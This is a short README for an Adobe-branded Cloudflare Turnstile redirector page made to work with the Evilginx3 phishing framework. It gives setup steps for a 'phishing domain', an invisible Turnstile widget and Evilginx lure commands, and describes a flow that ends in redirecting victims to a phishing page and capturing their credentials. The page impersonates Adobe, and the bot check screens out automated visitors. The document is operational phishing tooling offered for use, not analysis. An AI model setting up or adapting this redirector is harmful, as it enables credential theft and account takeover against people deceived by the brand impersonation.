# Adobe Turnstile Redirector

Adobe-branded Cloudflare Turnstile verification page for Evilginx3.

## Setup

1. **Create Turnstile Site** in Cloudflare dashboard
   - Domain: Your phishing domain
   - Widget Mode: Invisible
   - Copy Site Key

2. **Configure Redirector**
   - Edit `index.html`
   - Replace `'YOUR_TURNSTILE_SITE_KEY'` with your Site Key

3. **Use with Lure**
   ```bash
   lures create adobe
   lures edit <id> redirector adobe_turnstile
   lures get-url <id>
   ```

## How It Works

Lure URL → Adobe verification → Turnstile check → Redirect to phishing page → Capture credentials
